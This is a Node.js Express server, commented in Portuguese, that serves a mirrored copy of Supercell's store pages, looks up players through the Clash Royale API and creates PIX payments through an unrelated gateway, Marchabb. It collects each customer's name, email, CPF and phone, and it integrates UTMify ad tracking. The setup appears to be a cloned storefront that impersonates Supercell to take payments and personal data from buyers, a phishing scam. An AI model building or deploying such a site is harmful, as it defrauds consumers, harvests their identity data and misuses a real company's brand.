/**
 * Servidor Principal para Railway/SquareCloud
 * Servidor unificado com todas as funcionalidades
 */

const express = require("express");
const path = require("path");
const fs = require("fs");
const cors = require("cors");

// Importa as rotas do UTMify (não inicia servidor separado)
const utmifyRouter = require("./utmify-proxy-server");

// ==========================================
// CONFIGURAÇÃO
// ==========================================
const PORT = process.env.PORT || 8080;

// ==========================================
// SERVIDOR PRINCIPAL
// ==========================================
const app = express();

app.use(cors());
app.use(express.json());

// ==========================================
// SERVIR ARQUIVOS ESTÁTICOS COM MAPEAMENTO CORRETO
// ==========================================

// Mapear /_next/ para store.supercell.com/_next/ (com decode de URL)
app.use(
  "/_next",
  express.static(path.join(__dirname, "store.supercell.com/_next"), {
    setHeaders: (res, filePath) => {
      // Definir MIME types corretos
      if (filePath.endsWith(".js")) {
        res.setHeader("Content-Type", "application/javascript");
      } else if (filePath.endsWith(".css")) {
        res.setHeader("Content-Type", "text/css");
      }
    },
  })
);

// Mapear /images/ para store.supercell.com/images/
app.use(
  "/images",
  express.static(path.join(__dirname, "store.supercell.com/images"))
);

// Mapear /rive-assets/ para store.supercell.com/rive-assets/
app.use(
  "/rive-assets",
  express.static(path.join(__dirname, "store.supercell.com/rive-assets"))
);

// Servir arquivos da raiz
app.use(express.static("."));

// ==========================================
// ROTAS PRINCIPAIS
// ==========================================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/checkout", (req, res) => {
  res.sendFile(path.join(__dirname, "checkout.html"));
});

// Rota para player API (real ou mock)
app.get("/player", async (req, res) => {
  const tag = req.query.tag;
  if (!tag) {
    return res.status(400).json({ error: "Tag é obrigatória" });
  }

  // Limpa o token removendo espaços, quebras de linha e caracteres inválidos
  const rawToken = process.env.CR_API_TOKEN || "";
  const apiToken = rawToken.trim().replace(/[\r\n\t]/g, "");

  // Se não tiver token configurado, retorna dados mockados
  if (!apiToken || apiToken === "seu_token_aqui" || apiToken.length < 50) {
    console.log(
      "⚠️ CR_API_TOKEN não configurado ou inválido, usando dados mockados"
    );
    return res.json({
      tag: tag,
      name: "Jogador Demo",
      expLevel: 50,
      trophies: 6500,
      bestTrophies: 7200,
      wins: 1500,
      losses: 800,
      clan: {
        tag: "#CLAN123",
        name: "Clash Royale BR",
      },
      _mock: true,
    });
  }

  // Chamada real à API do Clash Royale
  try {
    const fetch = (...args) =>
      import("node-fetch").then(({ default: fetch }) => fetch(...args));
    const cleanTag = tag.replace("#", "").replace("%23", "");
    const apiUrl = `https://api.clashroyale.com/v1/players/%23${cleanTag}`;

    console.log(`🎮 Buscando jogador na API real: ${cleanTag}`);
    console.log(`🔑 Token length: ${apiToken.length} chars`);

    const response = await fetch(apiUrl, {
      method: "GET",
      headers: {
        Authorization: "Bearer " + apiToken,
        Accept: "application/json",
      },
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Erro API Clash Royale:", response.status, errorText);

      // Se falhar, retorna mock como fallback
      return res.json({
        tag: tag,
        name: "Jogador Demo",
        expLevel: 50,
        trophies: 6500,
        bestTrophies: 7200,
        wins: 1500,
        losses: 800,
        clan: {
          tag: "#CLAN123",
          name: "Clash Royale BR",
        },
        _mock: true,
        _error: `API error: ${response.status}`,
      });
    }

    const data = await response.json();
    console.log("✅ Dados reais recebidos da API Clash Royale");
    return res.json(data);
  } catch (error) {
    console.error("❌ Erro ao buscar jogador:", error.message);

    // Se der erro, retorna mock como fallback
    return res.json({
      tag: tag,
      name: "Jogador Demo",
      expLevel: 50,
      trophies: 6500,
      bestTrophies: 7200,
      wins: 1500,
      losses: 800,
      clan: {
        tag: "#CLAN123",
        name: "Clash Royale BR",
      },
      _mock: true,
      _error: error.message,
    });
  }
});

// API para criar PIX usando Marchabb
app.post("/api/create-pix", async (req, res) => {
  const { amount, customer, items } = req.body;

  console.log(
    "Recebido no /api/create-pix:",
    JSON.stringify(req.body, null, 2)
  );

  // Credenciais da Marchabb (definir nas variáveis de ambiente)
  const publicKey = process.env.MARCHABB_PUBLIC_KEY || "";
  const secretKey = process.env.MARCHABB_SECRET_KEY || "";

  // Se não tiver credenciais, retorna erro
  if (!publicKey || !secretKey) {
    console.error("Credenciais Marchabb não configuradas");
    return res.status(500).json({
      success: false,
      error: "Gateway de pagamento não configurado",
    });
  }

  try {
    // Monta a autenticação Basic
    const auth =
      "Basic " + Buffer.from(publicKey + ":" + secretKey).toString("base64");

    // Converte amount para centavos (verifica se já é em centavos ou não)
    const amountInCents = amount > 1000 ? amount : Math.round(amount * 100);

    // Monta o payload conforme documentação Marchabb
    const payload = {
      amount: amountInCents,
      paymentMethod: "pix",
      pix: {
        expiresInDays: 1,
      },
      items:
        items && items.length > 0
          ? items.map((item) => ({
              name: item.title || item.name || "Produto Clash Royale",
              quantity: item.quantity || item.qty || 1,
              // unitPrice já vem em centavos do checkout
              unitPrice:
                item.unitPrice || Math.round((item.price || 100) * 100),
              tangible: item.tangible !== undefined ? item.tangible : false,
            }))
          : [
              {
                name: "Produto Clash Royale",
                quantity: 1,
                unitPrice: amountInCents,
                tangible: false,
              },
            ],
      customer: {
        name: customer?.name || "Cliente",
        email: customer?.email || "cliente@email.com",
        document: {
          type: "cpf",
          number: (
            customer?.document?.number ||
            customer?.cpf ||
            "00000000000"
          ).replace(/\D/g, ""),
        },
        phone: {
          countryCode: "55",
          areaCode: (customer?.phone || "11999999999").substring(0, 2),
          number: (customer?.phone || "11999999999")
            .substring(2)
            .replace(/\D/g, ""),
        },
      },
    };

    console.log(
      "Enviando requisição para Marchabb:",
      JSON.stringify(payload, null, 2)
    );

    // Faz a requisição para a API Marchabb
    const response = await fetch("https://api.marchabb.com/v1/transactions", {
      method: "POST",
      headers: {
        Authorization: auth,
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    });

    const data = await response.json();
    console.log("Resposta Marchabb:", JSON.stringify(data, null, 2));

    if (!response.ok) {
      console.error("Erro Marchabb:", data);
      return res.status(response.status).json({
        success: false,
        error: data.message || "Erro ao criar PIX",
        details: data,
      });
    }

    // Retorna os dados do PIX
    res.json({
      success: true,
      pix: {
        qrcode: data.pix?.qrCode || data.pix?.qrcode || data.pixQrCode,
        qrcodeImage: data.pix?.qrCodeImage || data.pix?.qrcodeImage,
        copyPaste: data.pix?.copyAndPaste || data.pix?.brcode,
      },
      transactionId: data.id || data.transactionId,
      expirationDate: data.pix?.expiresAt || data.expirationDate,
      status: data.status,
    });
  } catch (error) {
    console.error("Erro ao criar PIX:", error);
    res.status(500).json({
      success: false,
      error: "Erro interno ao processar pagamento",
      details: error.message,
    });
  }
});

// Carrega dados mockados da API
const apiDataPath = path.join(__dirname, "api-data");
if (fs.existsSync(apiDataPath)) {
  try {
    const manifestPath = path.join(apiDataPath, "manifest.json");
    if (fs.existsSync(manifestPath)) {
      const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf-8"));

      // O manifest é um array direto, não um objeto com propriedade apis
      const apis = Array.isArray(manifest) ? manifest : manifest.apis || [];

      apis.forEach((api) => {
        // Usa url como path se path não existir
        const apiPath = api.path || new URL(api.url).pathname;
        const filePath = path.join(apiDataPath, api.file);

        if (fs.existsSync(filePath)) {
          const data = JSON.parse(fs.readFileSync(filePath, "utf-8"));
          app.get(apiPath, (req, res) => {
            res.json(data);
          });
          app.post(apiPath, (req, res) => {
            res.json(data);
          });
          console.log(`📦 Rota mockada: ${apiPath}`);
        }
      });
      console.log(`✅ ${apis.length} rotas da API carregadas`);
    }
  } catch (error) {
    console.error("⚠️ Erro ao carregar manifest.json:", error.message);
  }
}

// Monta as rotas do UTMify no servidor principal
app.use(utmifyRouter);

// Rota de saúde para Railway
app.get("/health", (req, res) => {
  res.status(200).json({
    status: "healthy",
    service: "Clash Royale Store",
    timestamp: new Date().toISOString(),
    port: PORT,
  });
});

// Rota para descobrir o IP público do servidor
app.get("/get-ip", async (req, res) => {
  try {
    const fetch = (...args) =>
      import("node-fetch").then(({ default: fetch }) => fetch(...args));
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    res.json({
      ip: data.ip,
      message:
        "🎯 Use este IP na API do Clash Royale: developer.clashroyale.com",
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    res.status(500).json({
      error: error.message,
      message: "Tente acessar https://api.ipify.org manualmente",
    });
  }
});

// ==========================================
// INICIA SERVIDOR
// ==========================================
app.listen(PORT, "0.0.0.0", () => {
  console.log("🎮 Clash Royale Store rodando na porta", PORT);
  console.log("📊 UTMify Proxy integrado no mesmo servidor");
  console.log("🌐 Ambiente:", process.env.NODE_ENV || "development");
  console.log("✅ Servidor pronto e aceitando conexões!");
  console.log("🏥 Healthcheck disponível em /health");
});

module.exports = app;
